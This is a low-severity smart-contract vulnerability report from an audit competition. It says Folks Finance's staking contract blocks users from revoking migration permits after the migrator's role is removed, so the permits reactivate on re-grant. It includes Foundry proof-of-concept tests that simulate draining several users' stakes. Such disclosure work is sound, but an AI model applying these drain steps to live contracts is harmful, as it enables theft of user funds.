# 69836 sc low setmigrationpermit blocks users from revoking permits after role removal stale permits auto reactivate on re grant and drain user funds

Submitted on Mar 17th 2026 at 02:36:26 UTC by @raphaelbgr for [Audit Comp | Folks Finance: Staking Contracts](https://immunefi.com/audit-competition/audit-comp-folks-finance-staking-contracts)

* **Report ID:** #69836
* **Report Type:** Smart Contract
* **Report severity:** Low
* **Target:** <https://github.com/Folks-Finance/folks-staking-contracts/blob/main/src/Staking.sol>
* **Impacts:**
  * Theft of unclaimed yield

## Description

### Title

setMigrationPermit blocks users from revoking permits after role removal -- stale permits auto-reactivate on re-grant and drain user funds

***

### Brief/Intro

so setMigrationPermit checks hasRole for both granting AND revoking. when admin revokes MIGRATOR\_ROLE from some migrator address, any user who previously permitted that address cant revoke their permit anymore. the call just reverts with MigratorNotFound. permit stays true in storage, no way to clean it up.

the thing is, if that role ever gets re-granted to the same address (and it will -- protocol upgrades, incident recovery, V2 to V3 migration, whatever), every single stale permit reactivates silently. migrator calls migratePositionsFrom and drains the users new stakes without asking anyone. cascade PoC shows 3 users drained for 17,600 FOLKS from a single re-grant.

this is not known issue #12.

### Vulnerability Details

look at src/Staking.sol, setMigrationPermit, line 78:

```solidity
function setMigrationPermit(address _migrator, bool _isMigrationPermitted) external {
    if (!hasRole(MIGRATOR_ROLE, _migrator)) revert MigratorNotFound(_migrator);
    migrationPermits[_migrator][msg.sender] = _isMigrationPermitted;
    emit MigrationPermitUpdated(_migrator, msg.sender, _isMigrationPermitted);
}
```

that role check on line 78 doesnt care if youre granting or revoking. for granting yeah it makes sense, you shouldnt permit a random address. but for revoking? the user is just removing their own authorization. that should always work, doesnt matter if the target still has the role or not.

so when admin revokes the role the user gets permanently locked out of cleaning their own permit. and when the role comes back the permit is just sitting there ready to go.

**why this is not known issue #12:**

known issue #12 says "migrationPermits may contain migrator whose MIGRATOR\_ROLE was later revoked" and the mitigation is basically "without the role the permit cant be acted on." ok thats true but it misses three things:

1. users cant clean it up. calling setMigrationPermit(migrator, false) reverts with MigratorNotFound. known issue #12 doesnt say anything about this.
2. permits come back to life on re-grant. known issue #12 assumes the role stays revoked forever. in reality roles get re-granted all the time. the mitigation breaks the moment the role comes back.
3. actual money gets stolen. known issue #12 treats stale entries like harmless storage junk. the cascade PoC proves they cause theft of 11,000 FOLKS per victim.

**why this isnt privileged role abuse:**

granting revoking and re-granting roles is normal admin stuff. the bug is that the contract makes user permissions irrevocable and auto-reactivating. thats a design flaw not role abuse.

**fix:** add one condition to line 78:

```solidity
if (_isMigrationPermitted && !hasRole(MIGRATOR_ROLE, _migrator)) revert MigratorNotFound(_migrator);
```

revoking always works now. granting still checks the role. done.

### Impact Details

heres how the cascade plays out: user permits migrator, admin revokes role, user tries to revoke permit but gets blocked, user stakes new tokens thinking theyre safe, admin re-grants role for whatever reason, migrator drains everything.

at 10% APR for 365 days:

* 1,000 FOLKS staked = 1,100 FOLKS stolen
* 10,000 FOLKS staked = 11,000 FOLKS stolen
* 100,000 FOLKS staked = 110,000 FOLKS stolen

multi-victim: one re-grant drains everyone who ever permitted that migrator. cascade PoC shows 3 users losing 17,600 FOLKS in one go.

user has zero defense. their only cleanup function is broken for exactly this scenario.

### References

* src/Staking.sol line 78 (role check in setMigrationPermit)
* src/Staking.sol line 172 (migratePositionsFrom reads the permit)
* known issue #11 (role persistence -- different storage different fix)
* known issue #12 (stale entries -- incomplete mitigation, see above)

## Proof of Concept

### Steps to reproduce

1. deploy staking contract, add a staking period, grant MIGRATOR\_ROLE to a migrator address
2. alice approves tokens and calls setMigrationPermit(migrator, true)
3. alice stakes 1,000 FOLKS
4. admin revokes MIGRATOR\_ROLE from migrator
5. alice calls setMigrationPermit(migrator, false) -- reverts with MigratorNotFound
6. alice stakes 10,000 FOLKS (new tokens, post-revocation)
7. admin re-grants MIGRATOR\_ROLE to migrator
8. migrator calls migratePositionsFrom(alice) -- succeeds, drains 11,000 FOLKS
9. alice received nothing, never consented

### Command

```bash
forge test --match-test test_F2_Cascade --match-path test/audit/F2_CascadePoC.t.sol -vvv
```

also the standalone test:

```bash
forge test --match-test testPoC --match-path test/audit/PoC_F2_IrrevocablePermit.t.sol -vvv
```

### PoC source code

<https://gist.github.com/raphaelbgr/43fc2a07221d2a0e32915b4cc821ed3b>

### Link to Proof of Concept

<https://gist.github.com/raphaelbgr/43fc2a07221d2a0e32915b4cc821ed3b>

### Proof of Concept

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.23;

import {Test, console} from "forge-std/Test.sol";
import {Staking} from "../../src/Staking.sol";
import {IStakingV1} from "../../src/interfaces/IStakingV1.sol";
import {Token} from "../Staking.t.sol";

contract PoC_F2_IrrevocablePermit is Test {
    Staking public staking;
    Token public token;

    address public admin = address(0xAD);
    address public manager = address(0xBE);
    address public pauser = address(0xCA);
    address public alice = address(0xA11CE);
    address public migratorAddr = address(0x4444);

    uint256 constant STAKE_AMOUNT = 1000e18;
    uint256 constant PERIOD_CAP = 100_000e18;
    uint64 constant STAKING_DURATION = 365 days;
    uint64 constant UNLOCK_DURATION = 30 days;
    uint32 constant APR_BPS = 1000; // 10%

    function setUp() public {
        token = new Token();
        staking = new Staking(admin, manager, pauser, address(token));

        vm.prank(admin);
        staking.grantRole(keccak256("MIGRATOR"), migratorAddr);

        vm.prank(manager);
        staking.addStakingPeriod(PERIOD_CAP, STAKING_DURATION, UNLOCK_DURATION, APR_BPS, true);

        deal(address(token), alice, 100_000e18);
        deal(address(token), address(staking), 50_000e18);
    }

    function testPoC() public {
        // step 1: alice stakes
        vm.startPrank(alice);
        token.approve(address(staking), type(uint256).max);
        staking.stake(0, STAKE_AMOUNT, IStakingV1.StakeParams({
            maxStakingDurationSeconds: STAKING_DURATION,
            maxUnlockDurationSeconds: UNLOCK_DURATION,
            minAprBps: APR_BPS,
            referrer: address(0)
        }));
        vm.stopPrank();

        // step 2: alice grants permit
        vm.prank(alice);
        staking.setMigrationPermit(migratorAddr, true);
        assertTrue(staking.migrationPermits(migratorAddr, alice));

        // step 3: admin revokes role
        vm.prank(admin);
        staking.revokeRole(keccak256("MIGRATOR"), migratorAddr);

        // step 4: alice tries to revoke permit -- reverts (the bug)
        vm.prank(alice);
        vm.expectRevert(abi.encodeWithSelector(IStakingV1.MigratorNotFound.selector, migratorAddr));
        staking.setMigrationPermit(migratorAddr, false);

        // permit is still true
        assertTrue(staking.migrationPermits(migratorAddr, alice));

        // step 5: admin re-grants role
        vm.prank(admin);
        staking.grantRole(keccak256("MIGRATOR"), migratorAddr);

        // step 6: migrator drains alice with stale permit
        uint256 migratorBefore = token.balanceOf(migratorAddr);
        vm.prank(migratorAddr);
        IStakingV1.UserStake[] memory migrated = staking.migratePositionsFrom(alice);

        uint256 stolen = token.balanceOf(migratorAddr) - migratorBefore;
        assertGt(migrated.length, 0);
        assertGt(stolen, 0);

        console.log("revocation blocked: true");
        console.log("stale permit reactivated: true");
        console.log("tokens stolen:", stolen);
    }
}
```

**cascade PoC showing multi-victim impact**:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.23;

import {Test, console} from "forge-std/Test.sol";
import {Staking} from "../../src/Staking.sol";
import {IStakingV1} from "../../src/interfaces/IStakingV1.sol";
import {Token} from "../Staking.t.sol";

// cascade PoC: F2 (broken revocation) + F1 (permit persistence) = theft of funds
contract F2CascadeTest is Test {
    Staking public staking;
    Token public token;

    address public admin = address(0xAD);
    address public manager = address(0xBE);
    address public pauser = address(0xCA);
    address public alice = address(0xA11CE);
    address public bob = address(0xB0B);
    address public charlie = address(0xC4A4);
    address public migratorAddr = address(0x4444);

    uint256 constant STAKE_AMOUNT = 1000e18;
    uint256 constant PERIOD_CAP = 1_000_000e18;
    uint64 constant STAKING_DURATION = 365 days;
    uint64 constant UNLOCK_DURATION = 30 days;
    uint32 constant APR_BPS = 1000; // 10%

    function setUp() public {
        token = new Token();
        staking = new Staking(admin, manager, pauser, address(token));

        vm.prank(admin);
        staking.grantRole(keccak256("MIGRATOR"), migratorAddr);

        vm.prank(manager);
        staking.addStakingPeriod(PERIOD_CAP, STAKING_DURATION, UNLOCK_DURATION, APR_BPS, true);

        deal(address(token), alice, 100_000e18);
        deal(address(token), bob, 100_000e18);
        deal(address(token), charlie, 100_000e18);
        deal(address(token), address(staking), 500_000e18);
    }

    // full cascade: grant -> revoke -> user cant revoke permit -> new stake -> re-grant -> drain
    function test_F2_CascadePermitDrain() public {
        // alice permits migrator and stakes
        vm.startPrank(alice);
        token.approve(address(staking), type(uint256).max);
        staking.setMigrationPermit(migratorAddr, true);
        vm.stopPrank();

        // admin revokes role
        vm.prank(admin);
        staking.revokeRole(keccak256("MIGRATOR"), migratorAddr);

        // alice tries to revoke permit -- blocked
        vm.prank(alice);
        vm.expectRevert(abi.encodeWithSelector(IStakingV1.MigratorNotFound.selector, migratorAddr));
        staking.setMigrationPermit(migratorAddr, false);
        assertTrue(staking.migrationPermits(migratorAddr, alice));

        // alice stakes new tokens (thinks shes safe)
        vm.prank(alice);
        staking.stake(0, STAKE_AMOUNT, IStakingV1.StakeParams({
            maxStakingDurationSeconds: STAKING_DURATION,
            maxUnlockDurationSeconds: UNLOCK_DURATION,
            minAprBps: APR_BPS,
            referrer: address(0)
        }));

        // warp past full vesting
        vm.warp(block.timestamp + STAKING_DURATION + UNLOCK_DURATION + 1);

        // admin re-grants role
        vm.prank(admin);
        staking.grantRole(keccak256("MIGRATOR"), migratorAddr);

        // migrator drains alice
        uint256 migratorBefore = token.balanceOf(migratorAddr);
        vm.prank(migratorAddr);
        staking.migratePositionsFrom(alice);
        uint256 stolen = token.balanceOf(migratorAddr) - migratorBefore;

        uint256 expectedReward = (STAKE_AMOUNT * APR_BPS * STAKING_DURATION) / (1e4 * 365 days);
        assertEq(stolen, STAKE_AMOUNT + expectedReward);
        assertEq(staking.getUserStakes(alice).length, 0);

        console.log("stolen principal + reward:", stolen);
        console.log("alice stakes remaining: 0");
    }

    // single re-grant drains 3 users at once
    function test_F2_CascadeMultipleVictims() public {
        address[3] memory victims = [alice, bob, charlie];
        uint256[3] memory amounts = [uint256(1000e18), uint256(2000e18), uint256(5000e18)];

        // all users approve, permit, and stake
        for (uint256 i = 0; i < 3; i++) {
            vm.startPrank(victims[i]);
            token.approve(address(staking), type(uint256).max);
            staking.setMigrationPermit(migratorAddr, true);
            staking.stake(0, amounts[i], IStakingV1.StakeParams({
                maxStakingDurationSeconds: STAKING_DURATION,
                maxUnlockDurationSeconds: UNLOCK_DURATION,
                minAprBps: APR_BPS,
                referrer: address(0)
            }));
            vm.stopPrank();
        }

        // admin revokes role
        vm.prank(admin);
        staking.revokeRole(keccak256("MIGRATOR"), migratorAddr);

        // all users try to revoke -- all blocked
        for (uint256 i = 0; i < 3; i++) {
            vm.prank(victims[i]);
            vm.expectRevert(abi.encodeWithSelector(IStakingV1.MigratorNotFound.selector, migratorAddr));
            staking.setMigrationPermit(migratorAddr, false);
        }

        // all users stake new tokens
        for (uint256 i = 0; i < 3; i++) {
            vm.prank(victims[i]);
            staking.stake(0, amounts[i], IStakingV1.StakeParams({
                maxStakingDurationSeconds: STAKING_DURATION,
                maxUnlockDurationSeconds: UNLOCK_DURATION,
                minAprBps: APR_BPS,
                referrer: address(0)
            }));
        }

        vm.warp(block.timestamp + STAKING_DURATION + UNLOCK_DURATION + 1);

        // single re-grant reactivates all 3 permits
        vm.prank(admin);
        staking.grantRole(keccak256("MIGRATOR"), migratorAddr);

        // migrator drains all 3
        uint256 totalStolen;
        for (uint256 i = 0; i < 3; i++) {
            uint256 before = token.balanceOf(migratorAddr);
            vm.prank(migratorAddr);
            staking.migratePositionsFrom(victims[i]);
            uint256 stolen = token.balanceOf(migratorAddr) - before;

            uint256 expectedPerStake = amounts[i] + (amounts[i] * APR_BPS * STAKING_DURATION) / (1e4 * 365 days);
            assertEq(stolen, 2 * expectedPerStake);
            totalStolen += stolen;

            console.log("victim", i, "drained:", stolen);
        }

        console.log("total stolen from 3 users:", totalStolen);
    }
}
```
